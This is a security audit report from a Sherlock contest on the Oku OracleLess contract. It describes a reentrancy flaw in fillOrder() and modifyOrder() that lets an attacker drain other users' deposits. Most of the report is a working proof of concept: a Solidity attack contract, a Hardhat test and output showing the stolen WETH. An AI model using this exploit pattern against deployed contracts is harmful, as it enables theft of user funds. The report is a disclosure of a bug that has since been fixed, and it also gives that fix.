---
tags:
  - lang/solidity
  - sector/lending
  - sector/oracle
  - sector/stable
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - vuln/access-control/missing-modifier
  - impact/loss-of-funds/direct-drain
  - fix/add-access-control
  - fix/use-reentrancy-guard
  - novelty/variant
  - misassumption/admin-is-honest
protocol: "[[Oku'S New Order Types Contract Contest]]"
auditors:
  - "[[DenTonylifer]]"
report: "https://github.com/sherlock-audit/2024-11-oku-judging"
genome:
  - "[[missing-modifier]]"
  - "[[direct-drain]]"
  - "[[add-access-control]]"
  - "[[use-reentrancy-guard]]"
  - "[[variant]]"
  - "[[access-roles]]"
  - "[[reentrancy-guard]]"
---
# H-3: Lack of nonReentrant modifier in fillOrder() and modifyOrder() allows attacker to steal funds

- id: 44373
- impact: HIGH
- protocol: [[Oku'S New Order Types Contract Contest]]
- reporter: DenTonylifer (Sherlock)
- source: N/A

## Summary


This bug report highlights an issue with the lack of a certain modifier in the code, which can allow an attacker to steal funds from the victim. The report explains the root causes and provides a detailed attack path, along with a proof of concept. The impact of this bug is considered to be high, as it can result in the loss of funds for both the victim and the protocol. The report also suggests adding the missing modifier to prevent this type of attack. The issue has been fixed by the protocol team in a recent update.

## Details

Source: https://github.com/sherlock-audit/2024-11-oku-judging/issues/421 

## Found by 
0rpse, 0x007, 0xNirix, 0xProf, 0xaxaxa, AshishLac, Atharv, Bigsam, BugPull, ChaosSR, ChinmayF, Contest-Squad, DenTonylifer, Falendar, LonWof-Demon, LordAdhaar, NoOneWinner, Uddercover, Xcrypt, Z3R0, ami, covey0x07, durov, iamandreiski, joshuajee, kfx, lanrebayode77, pkabhi01, silver\_eth, t.aksoy, t0x1c, vinica\_boy, whitehair0330, xiaoming90, y51r, zhoo, zxriptor
## Description
**_Root Causes:_**
1. [OracleLess.sol::fillOrder()](https://github.com/gfx-labs/oku-custom-order-types/blob/b84e5725f4d1e0a1ee9048baf44e68d2e53ec971/contracts/automatedTrigger/OracleLess.sol#L103) can be called by anyone with a malicious `txData`. 
2. [OracleLess.sol::fillOrder()](https://github.com/gfx-labs/oku-custom-order-types/blob/b84e5725f4d1e0a1ee9048baf44e68d2e53ec971/contracts/automatedTrigger/OracleLess.sol#L103) lacks a `nonReentrant` modifier. 
3. [OracleLess.sol::modifyOrder()](https://github.com/gfx-labs/oku-custom-order-types/blob/b84e5725f4d1e0a1ee9048baf44e68d2e53ec971/contracts/automatedTrigger/OracleLess.sol#L80) lacks a `nonReentrant` modifier. 

**_Attack Path:_** (Please refer PoC for detailed execution flow)
1. Suppose the current `pendingOrderIds` looks like:
```text
pendingOrderIds = [N,  A1,  A2]
                   0    1    2    (array indices)
```
`Order-N` is by the victim, a naive user. Orders `A1` and `A2` are by the attacker.

2. Attacker has made sure the `Order-A1` and `Order-A2` recipient is a contract with address say, `target`.
3. Attacker's `Order-A1` is in range so they call `fillOrder()` with malicious `txData`.
4. `fillOrder()` internally calls `execute()` which internally calls `target.call(txData)` where both `target` and `txData` are attacker controlled.
5. From inside the `target` contract (let's say a function named `attack()`), they pull the tokenIn (WETH) of `Order-A1` as they have the approval.
6. `attack()` then sends `1 wei` of tokenOut (USDC) or any minimum amount back. The attacker will get this back later.
7. `attack()` then calls `modifyOrder(Order-A1)` and decreases the position size to the minimum allowed. They are immediately credited say, `M` WETH.
8. `attack()` next calls `modifyOrder(Order-A2)` and increases the position size to park this `M` WETH. This is done so that the overall WETH balance of OracelLess contract is not affected by this theft and the [following check](https://github.com/gfx-labs/oku-custom-order-types/blob/b84e5725f4d1e0a1ee9048baf44e68d2e53ec971/contracts/automatedTrigger/OracleLess.sol#L247) about over-spend inside `execute()` passes successfully:
```js
        require(finalTokenIn >= initialTokenIn - order.amountIn, "over spend");
```
9. The control now exits `attack()` and `fillOrder()` continues further. The code goes ahead and removes `Order-A1` from the pending order array and sends back the `1 wei` USDC to `target` on [L141](https://github.com/gfx-labs/oku-custom-order-types/blob/b84e5725f4d1e0a1ee9048baf44e68d2e53ec971/contracts/automatedTrigger/OracleLess.sol#L141). The attacker is at no loss & no gain right now.
10. The attacker now cancels `Order-A2` and receives the `M` WETH back too, thus stealing it from the rightful funds of the victim/protocol.

**_Note:_** In spite of similar structures, this attack can't be carried out inside `Bracket.sol::performUpkeep()` as `Bracket.sol::modifyOrder()` is protected by the `nonReentrant` modifier.

## Impact
High. Victim & protocol funds can be stolen at no substantial cost to the attacker.

## Proof Of Concept
1. First, add a file named `MaliciousOracleLessTarget.sol` under the `contracts/` directory:
<details>
<summary>
View MaliciousOracleLessTarget.sol
</summary>

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./interfaces/openzeppelin/IERC20.sol";
import "./interfaces/openzeppelin/SafeERC20.sol";

interface IOracleLess {
    function createOrder(
        IERC20 tokenIn,
        IERC20 tokenOut,
        uint256 amountIn,
        uint256 minAmountOut,
        address recipient,
        uint16 feeBips,
        bool permit,
        bytes calldata permitPayload
    ) external returns (uint96 orderId);

    function fillOrder(
        uint96 pendingOrderIdx,
        uint96 orderId,
        address target,
        bytes calldata txData
    ) external;

    function cancelOrder(uint96 orderId) external;
}

contract MaliciousOracleLessTarget {
    using SafeERC20 for IERC20;

    address public immutable oracleLessContract;
    IERC20 public immutable weth;
    IERC20 public immutable usdc;
    uint96 public secondOrderId;
    
    constructor(address _oracleLess, address _weth, address _usdc) {
        oracleLessContract = _oracleLess;
        weth = IERC20(_weth);
        usdc = IERC20(_usdc);
        weth.safeApprove(_oracleLess, type(uint256).max);
    }

    function setSecondOrderId(uint96 _orderId) external {
        secondOrderId = _orderId;
    }

    
    function createOrder(
        IERC20 tokenIn,
        IERC20 tokenOut,
        uint256 amountIn,
        uint256 minAmountOut,
        address recipient,
        uint16 feeBips,
        bool permit,
        bytes calldata permitPayload
    ) external {
        
        require (
            IOracleLess(oracleLessContract).createOrder(
            tokenIn,
            tokenOut,
            amountIn,
            minAmountOut,
            recipient,
            feeBips,
            permit,
            permitPayload
            ) > 0
        ); 
    }
    
    function fillOrder(
        uint96 pendingOrderIdx,
        uint96 orderId,
        address target,
        bytes calldata txData
    ) external {
        
        IOracleLess(oracleLessContract).fillOrder(
            pendingOrderIdx,
            orderId,
            target,
            txData
        );
    }

    function cancelOrder(uint96 orderId) external {
        IOracleLess(oracleLessContract).cancelOrder(orderId);
    }
    
    // During target.call() in fillOrder(), we:
    // 1. Modify first order to get funds back
    // 2. Transfer those funds to second order
    // 3. Send minimal USDC to pass balance check
    function attack(
        uint96 firstOrderId,
        uint256 amountToSteal,
        uint256 amountToReduce,
        uint256 minReturn
    ) external returns (bool) {
        // Step 0: Pull tokenIn (we have been provided the approval)
        weth.safeTransferFrom(msg.sender, address(this), amountToSteal);

        // Step 1: Modify first order to decrease position, getting back most funds
        (bool modifySuccess1,) = oracleLessContract.call(
            abi.encodeWithSignature(
                "modifyOrder(uint96,address,uint256,uint256,address,bool,bool,bytes)",
                firstOrderId,      // orderId
                usdc,             // _tokenOut unchanged
                amountToReduce,  // amountInDelta
                minReturn,        // _minAmountOut
                address(this),    // _recipient 
                false,           // increasePosition = false to decrease
                false,           // permit
                "0x"             // permitPayload
            )
        );
        require(modifySuccess1, "First modify failed");

        // Step 2: Increase position of second order with stolen funds
        (bool modifySuccess2,) = oracleLessContract.call(
            abi.encodeWithSignature(
                "modifyOrder(uint96,address,uint256,uint256,address,bool,bool,bytes)",
                secondOrderId,    // orderId 
                usdc,            // _tokenOut unchanged
                amountToReduce, // amountInDelta
                minReturn,       // _minAmountOut
                address(this),   // _recipient
                true,           // increasePosition = true to add funds
                false,          // permit
                "0x"            // permitPayload
            )
        );
        require(modifySuccess2, "Second modify failed");

        // Step 3: Send minimal USDC to pass balance check in fillOrder()
        usdc.safeTransfer(msg.sender, 1);

        return true;
    }

    receive() external payable {}
}
```

</details>

<br>
2. Second, add the following test case inside `test/triggerV2/happyPath.ts` and run to see it pass:
<details>
<summary>
View Test Case
</summary>

```diff
diff --git a/oku-custom-order-types/test/triggerV2/happyPath.ts b/oku-custom-order-types/test/triggerV2/happyPath.ts
index caeed34..1181295 100644
--- a/oku-custom-order-types/test/triggerV2/happyPath.ts
+++ b/oku-custom-order-types/test/triggerV2/happyPath.ts
@@ -1085,4 +1085,150 @@ describe("Oracle Less", () => {
 
 })
 
+// Add this test after the existing "Oracle Less" describe block:
+describe("OracleLess Attack via fillOrder and modifyOrder Reentrancy", () => {
+    let attackContract: string
+    let naiveOrderId: bigint
+    let firstOrderId: bigint
+    let secondOrderId: bigint
+    let attackWithWETH: bigint
+
+    before(async () => {
+        attackWithWETH = s.wethAmount / 3n
+        console.log("\nSetting up Oracle Less attack test...")
+        console.log("Attack amount:", ethers.formatEther(attackWithWETH), "WETH")
+        
+        s.OracleLess = await DeployContract(new OracleLess__factory(s.Frank), s.Frank, await s.Master.getAddress(), a.permit2)
+        // Fund victim
+        await stealMoney(s.wethWhale, await s.Oscar.getAddress(), await s.WETH.getAddress(), s.wethAmount / 3n)
+        const oscarBalance = await s.WETH.balanceOf(await s.Oscar.getAddress())
+        console.log("Oscar's WETH balance:", ethers.formatEther(oscarBalance))
+        
+        // Deploy malicious contract
+        const AttackFactory = await ethers.getContractFactory("MaliciousOracleLessTarget")
+        const attack = await AttackFactory.connect(s.Steve).deploy(
+            await s.OracleLess.getAddress(),
+            await s.WETH.getAddress(),
+            await s.USDC.getAddress()
+            )
+            attackContract = await attack.getAddress()
+            console.log("Attack contract deployed at:", attackContract)
+            
+        // Fund attack contract with WETH
+        await stealMoney(s.wethWhale, attackContract, await s.WETH.getAddress(), s.wethAmount - s.wethAmount / 3n)
+        console.log("Attack contract funded with", ethers.formatUnits(await s.WETH.balanceOf(attackContract), 18), "WETH")
+
+        // Fund attack contract with USDC
+        await stealMoney(s.usdcWhale, attackContract, await s.USDC.getAddress(), BigInt(2000000000))
+        const attackContractUSDC = await s.USDC.balanceOf(attackContract)
+        console.log("Attack contract funded with", ethers.formatUnits(attackContractUSDC, 6), "USDC")
+    })
+
+    it("Creates attacker's orders", async () => {
+        // Create first order by naive user
+        console.log("\nCreating first order by naive user...")
+        await s.WETH.connect(s.Oscar).approve(await s.OracleLess.getAddress(), s.wethAmount / 3n)
+        
+        let tx = await s.OracleLess.connect(s.Oscar).createOrder(
+            await s.WETH.getAddress(),
+            await s.USDC.getAddress(),
+            s.wethAmount / 3n,
+            0,
+            await s.Oscar.getAddress(),
+            0,
+            false, 
+            "0x"
+        )
+        
+        await tx.wait()
+        let pendingOrders = await s.OracleLess.getPendingOrders()
+        naiveOrderId = pendingOrders[0].orderId
+        expect(await s.WETH.balanceOf(await s.Oscar.getAddress())).to.be.eq(0)
+
+        // Create first attack order
+        const attack = await ethers.getContractAt("MaliciousOracleLessTarget", attackContract)
+        console.log("\nCreating first attack order...")
+
+        tx = await attack.connect(s.Steve).createOrder(
+            await s.WETH.getAddress(),
+            await s.USDC.getAddress(),
+            attackWithWETH,
+            0,
+            attackContract,
+            0,
+            false, 
+            "0x"
+        )
+        
+        await tx.wait()
+        pendingOrders = await s.OracleLess.getPendingOrders()
+        firstOrderId = pendingOrders[1].orderId
+
+        // Create second order
+        console.log("\nCreating second attack order...")
+        tx = await attack.connect(s.Steve).createOrder(
+            await s.WETH.getAddress(),
+            await s.USDC.getAddress(),
+            attackWithWETH,
+            0,
+            attackContract,
+            0,
+            false, 
+            "0x"
+        )
+
+        await tx.wait()
+        pendingOrders = await s.OracleLess.getPendingOrders()
+        secondOrderId = pendingOrders[2].orderId
+
+        // Configure attack contract
+        await attack.setSecondOrderId(secondOrderId)
+
+        // Verify orders
+        pendingOrders = await s.OracleLess.getPendingOrders()
+        expect(pendingOrders.length).to.be.eq(3, "Three orders should be pending")
+    })
+
+    it("Executes reentrancy attack", async () => {
+        const initWETH = await s.WETH.balanceOf(attackContract)
+        const initUSDC = await s.USDC.balanceOf(attackContract)
+        console.log("\nInitial balances of attackContract:")
+        console.log("WETH:", ethers.formatEther(initWETH))
+        console.log("USDC:", ethers.formatUnits(initUSDC, 6))
+
+        // Generate attack payload
+        const functionSelector = ethers.id("attack(uint96,uint256,uint256,uint256)").slice(0, 10)
+        const encodedParams = ethers.AbiCoder.defaultAbiCoder().encode(
+            ["uint96", "uint256", "uint256", "uint256"],
+            [firstOrderId, attackWithWETH, attackWithWETH - BigInt(1e16), 1n] // leave some WETH behind ... and 1 wei as minReturn
+        ).slice(2)
+        const attackData = functionSelector + encodedParams
+
+        console.log("Executing attack...")
+        const attack = await ethers.getContractAt("MaliciousOracleLessTarget", attackContract)
+        await attack.connect(s.Steve).fillOrder(
+            1,
+            firstOrderId,
+            attackContract,
+            attackData
+        )
+        await attack.connect(s.Steve).cancelOrder(
+            secondOrderId
+        )
+
+        const finalWETH = await s.WETH.balanceOf(attackContract)
+        const finalUSDC = await s.USDC.balanceOf(attackContract)
+        console.log("\nFinal balances:")
+        console.log("WETH:", ethers.formatEther(finalWETH))
+        console.log("USDC:", ethers.formatUnits(finalUSDC, 6))
+
+        expect(finalWETH).to.be.gt(attackWithWETH, "Should have gained WETH")
+        expect(finalUSDC).to.be.eq(initUSDC, "Should have no USDC spend")
+
+        const pendingOrders = await s.OracleLess.getPendingOrders()
+        expect(pendingOrders.length).to.be.eq(1, "Only the naive order should be pending")
+        expect(pendingOrders[0].orderId).to.be.eq(naiveOrderId, "Naive order id")
+    })
+})
+
 

```

</details>

<br>

Output:
```text
  OracleLess Attack via fillOrder and modifyOrder Reentrancy

Setting up Oracle Less attack test...
Attack amount: 0.55 WETH
Oscar's WETH balance: 0.55
Attack contract deployed at: 0xB737dD8FC9B304A3520B3bb609CC7532F1425Ad0
Attack contract funded with 1.1 WETH
Attack contract funded with 2000.0 USDC

Creating first order by naive user...

Creating first attack order...

Creating second attack order...
    ✔ Creates attacker's orders (78ms)

Initial balances of attackContract:
WETH: 0.0
USDC: 2000.0
Executing attack...

Final balances:
WETH: 1.64           <---------------------- started with 1.1 WETH, ended up with 1.64 WETH
USDC: 2000.0
    ✔ Executes reentrancy attack (61ms)
```

## Mitigation
Add the `nonReentrant` modifier to both `OracleLess.sol::fillOrder()` and `OracleLess.sol::modifyOrder()`.



## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/gfx-labs/oku-custom-order-types/pull/1
